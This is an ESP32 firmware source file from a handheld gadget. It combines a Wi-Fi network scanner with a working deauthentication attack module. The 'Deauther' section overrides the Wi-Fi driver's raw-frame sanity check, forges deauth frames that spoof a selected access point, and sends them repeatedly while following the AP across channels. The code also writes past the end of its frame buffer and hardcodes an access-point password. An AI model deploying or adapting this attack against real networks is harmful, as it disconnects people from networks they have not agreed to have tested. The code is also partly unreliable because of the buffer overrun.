/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */

#include "config.h"
#include "icon.h"

namespace WifiScan {
  
int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
bool isScanComplete = false;

unsigned long lastButtonPress = 0;
unsigned long debounceTime = 200;

void wifiscanSetup() {
  Serial.begin(115200);
  u8g2.setFont(u8g2_font_6x10_tr);
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
  
  for (int cycle = 0; cycle < 3; cycle++) { 
    for (int i = 0; i < 3; i++) {
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.drawStr(0, 10, "Scanning WiFi");

      String dots = "";
      for (int j = 0; j <= i; j++) {
        dots += ".";
        setNeoPixelColour("white");
      }
      setNeoPixelColour("0");
      
      u8g2.drawStr(80, 10, dots.c_str()); 

      u8g2.sendBuffer();
      delay(300); 
    }
  }
  
  scan_StartTime = millis();
  isScanComplete = false;
}

void wifiscanLoop() {
  unsigned long currentMillis = millis();

  if (!isScanComplete && currentMillis - scan_StartTime < scanTimeout) {
    int foundNetworks = WiFi.scanNetworks();
    if (foundNetworks >= 0) {
      isScanComplete = true;
    }
  }

  if (currentMillis - lastButtonPress > debounceTime) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (currentIndex > 0) {
        currentIndex--;
        if (currentIndex < listStartIndex) {
          listStartIndex--;
        }
      }
      lastButtonPress = currentMillis;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (currentIndex < WiFi.scanComplete() - 1) {
        currentIndex++;
        if (currentIndex >= listStartIndex + 5) {
          listStartIndex++;
        }
      }
      lastButtonPress = currentMillis;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      isDetailView = true;
      lastButtonPress = currentMillis;
    }
  }

  if (!isDetailView && isScanComplete) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Wi-Fi Networks:");

    int networkCount = WiFi.scanComplete();
    for (int i = 0; i < 5; i++) {
      int currentNetworkIndex = i + listStartIndex;
      if (currentNetworkIndex >= networkCount) break;

      String networkName = WiFi.SSID(currentNetworkIndex);
      int rssi = WiFi.RSSI(currentNetworkIndex);

      String networkInfo = networkName.substring(0, 7);
      String networkrssi = " | RSSI " + String(rssi);
      u8g2.setFont(u8g2_font_6x10_tr);

      if (currentNetworkIndex == currentIndex) {
        u8g2.drawStr(0, 23 + i * 10, ">");
      }
      u8g2.drawStr(10, 23 + i * 10, networkInfo.c_str());
      u8g2.drawStr(50, 23 + i * 10, networkrssi.c_str());
    }
    u8g2.sendBuffer();
  }

  if (isDetailView) {
    String networkName = WiFi.SSID(currentIndex);
    String networkBSSID = WiFi.BSSIDstr(currentIndex);
    int rssi = WiFi.RSSI(currentIndex);
    int channel = WiFi.channel(currentIndex);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Network Details:");

    u8g2.setFont(u8g2_font_5x8_tr);
    String name = "SSID: " + networkName;
    String bssid = "BSSID: " + networkBSSID;
    String signal = "RSSI: " + String(rssi);
    String ch = "Channel: " + String(channel);

    u8g2.drawStr(0, 20, name.c_str());
    u8g2.drawStr(0, 30, bssid.c_str());
    u8g2.drawStr(0, 40, signal.c_str());
    u8g2.drawStr(0, 50, ch.c_str());
    u8g2.drawStr(0, 60, "Press LEFT to go back");
    u8g2.sendBuffer();

    if (digitalRead(BTN_PIN_LEFT) == LOW) {
      isDetailView = false;
      lastButtonPress = currentMillis;
      }
    }
  }
}

namespace Deauther {

const int networks_per_page = 5;
int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
bool isScanComplete = false;

unsigned long lastButtonPress = 0;
unsigned long lastRightButtonPress = 0; 
const unsigned long debounceTime = 200; 
const unsigned long rightDebounceTime = 50; 

uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,                         // type, subtype c0: deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
    0x00, 0x00,                         // fragment & sequence number
    0x01, 0x00                          // reason code
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
String lastNeoPixelColour = "0"; 

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6); 
    memcpy(&deauth_frame[16], ap_record->bssid, 6); 
    deauth_frame[26] = 7;
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi; 
}

void drawScanScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Wi-Fi Networks:");
    
    if (scanning) {

    u8g2.setFont(u8g2_font_6x10_tr);
    for (int cycle = 0; cycle < 3; cycle++) {
        for (int i = 0; i < 3; i++) {
            u8g2.clearBuffer();
            u8g2.drawStr(0, 10, "Scanning WiFi");
            String dots = "";
            for (int j = 0; j <= i; j++) {
                dots += ".";
            }
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(80, 10, dots.c_str());
            setNeoPixelColour("white");
            u8g2.sendBuffer();
            delay(300);
        }
    }
        if (lastNeoPixelColour != "white") {
            setNeoPixelColour("white");
            lastNeoPixelColour = "white";
        }
        u8g2.sendBuffer();
        return;
    }

    if (network_count == 0) {
        u8g2.drawStr(10, 30, "No networks found.");
    } else {
      u8g2.setFont(u8g2_font_6x10_tr);
        for (int i = 0; i < networks_per_page; i++) {
            int currentNetworkIndex = i + listStartIndex;
            if (currentNetworkIndex >= network_count) break;

            String networkName = String((char*)ap_list[currentNetworkIndex].ssid);
            int rssi = ap_list[currentNetworkIndex].rssi;

            String networkInfo = networkName.substring(0, 7);
            String networkRssi = " | RSSI " + String(rssi);

            if (currentNetworkIndex == currentIndex) {
                u8g2.drawStr(0, 23 + i * 10, ">");
            }
            u8g2.drawStr(10, 23 + i * 10, networkInfo.c_str());
            u8g2.drawStr(50, 23 + i * 10, networkRssi.c_str());
        }
    }

    if (lastNeoPixelColour != "0") {
        setNeoPixelColour("0");
        lastNeoPixelColour = "0";
    }
    u8g2.sendBuffer();
}

bool scanNetworks() {
    scanning = true;
    currentIndex = 0;
    listStartIndex = 0;
    drawScanScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(1);

    network_count = WiFi.scanNetworks();
    if (network_count == 0) {
        scanning = false;
        drawScanScreen();
        isScanComplete = true;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        drawScanScreen();
        isScanComplete = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }
    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
    scanning = false;
    drawScanScreen();
    isScanComplete = true;
    return true;
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen(bool fullRedraw = true) {
    if (fullRedraw) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Network Details:");
        u8g2.setFont(u8g2_font_5x8_tr);

        static String name = "";
        static String bssid = "";
        static String signal = "";
        static String ch = "";
        static String authStr = "";
        if (!isDetailView) { 
            name = "";
            bssid = "";
            signal = "";
            ch = "";
            authStr = "";
        } else if (name.isEmpty()) { 
            name = "SSID: " + String((char*)selectedAp.ssid).substring(0, 15);
            bssid = "BSSID: " + String(selectedAp.bssid[0], HEX) + ":" + String(selectedAp.bssid[1], HEX) + ":" +
                    String(selectedAp.bssid[2], HEX) + ":" + String(selectedAp.bssid[3], HEX) + ":" +
                    String(selectedAp.bssid[4], HEX) + ":" + String(selectedAp.bssid[5], HEX);
            signal = "RSSI: " + String(selectedAp.rssi);
            ch = "Ch: " + String(selectedChannel);
            String auth;
            switch (selectedAp.authmode) {
                case WIFI_AUTH_OPEN: auth = "OPEN"; break;
                case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
                case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2"; break;
                default: auth = "Unknown"; break;
            }
            authStr = "Auth: " + auth;
        }

        u8g2.drawStr(0, 20, name.c_str());
        //u8g2.drawStr(0, 28, bssid.c_str());
        //u8g2.drawStr(0, 28, signal.c_str());
        //u8g2.drawStr(50, 28, ch.c_str());
        u8g2.drawStr(0, 30, authStr.c_str());
        u8g2.drawStr(0, 63, "Press RIGHT to Start");
    } else {
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, 60, 128, 8); 
        u8g2.drawBox(0, 68, 128, 8); 
        u8g2.setDrawColor(1);
    }

    String status = "Status: " + String(attack_running ? "Running" : "Stopped");
    String packets = "Pkts: " + String(packet_count);
    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    String success = "Succ: " + String(success_rate, 0) + "%";

    u8g2.drawStr(0, 40, status.c_str());
    u8g2.drawStr(84, 40, packets.c_str());
    u8g2.drawStr(0, 50, success.c_str());
    u8g2.drawStr(0, 63, "Press RIGHT to Start");

    setNeoPixelColour(attack_running ? "orange" : "0");
    u8g2.sendBuffer();
}

void handleButtons() {
    unsigned long currentMillis = millis();

    if (digitalRead(BTN_PIN_RIGHT) == LOW && currentMillis - lastRightButtonPress >= rightDebounceTime && !scanning) {
        unsigned long start = micros(); 
        lastRightButtonPress = currentMillis;

        delayMicroseconds(400);
        if (digitalRead(BTN_PIN_RIGHT) != LOW) return;

        if (!isDetailView && network_count > 0) {
            isDetailView = true;
            selectedAp = ap_list[currentIndex];
            selectedChannel = ap_list[currentIndex].primary;
            drawAttackScreen();
        } else if (isDetailView) {
            bool prev_running = attack_running;
            attack_running = !attack_running; 
            if (!attack_running) {
                last_packet_time = 0;
                esp_wifi_stop(); 
            } else if (!prev_running) {
                esp_wifi_start(); 
            }
            Serial.print("Right pressed, attack: "); Serial.println(attack_running ? "Running" : "Stopped");
            drawAttackScreen(false); 
        }
        while (digitalRead(BTN_PIN_RIGHT) == LOW); 
        Serial.print("Toggle latency: "); Serial.println(micros() - start); 
    }

    if (currentMillis - lastButtonPress < debounceTime || scanning) return;

    if (digitalRead(BUTTON_UP_PIN) == LOW) {
        if (!isDetailView && currentIndex > 0) {
            currentIndex--;
            if (currentIndex < listStartIndex) {
                listStartIndex--;
            }
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BUTTON_UP_PIN) == LOW); 
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
        if (!isDetailView && currentIndex < network_count - 1) {
            currentIndex++;
            if (currentIndex >= listStartIndex + networks_per_page) {
                listStartIndex++;
            }
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BUTTON_DOWN_PIN) == LOW); 
    } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
        if (isDetailView) { 
            attack_running = false;
            last_packet_time = 0;
            esp_wifi_stop(); 
            isDetailView = false;
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BTN_PIN_LEFT) == LOW); 
    }
}

void deautherSetup() {
    Serial.begin(115200);
    u8g2.begin();

    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
    pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

    setNeoPixelColour("0");
    lastNeoPixelColour = "0";

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(82));
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    wifi_config_t ap_config = {};
    strncpy((char*)ap_config.ap.ssid, "ESP32DIV", sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen("ESP32DIV");
    strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

    scan_StartTime = millis();
    isScanComplete = false;
    scanNetworks();
}

void deautherLoop() {
    handleButtons(); 

    unsigned long currentMillis = millis();
    if (!isScanComplete && currentMillis - scan_StartTime < scanTimeout) {
        if (WiFi.scanComplete() >= 0) {
            isScanComplete = true;
            drawScanScreen();
        }
    }

    if (attack_running && isDetailView) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0;
            esp_wifi_stop();
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (currentMillis - last_packet_time >= 100) {
            wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
            last_packet_time = currentMillis;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && currentMillis - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {};
                strncpy((char*)ap_config.ap.ssid, "nRF-BOX", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("nRF-BOX");
                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
                ap_config.ap.ssid_hidden = 0;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
            }
        }
        last_channel_check = currentMillis;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && currentMillis - last_status_time > 2000) {
        drawAttackScreen(false); 
        last_status_time = currentMillis;
    }
  }
} 
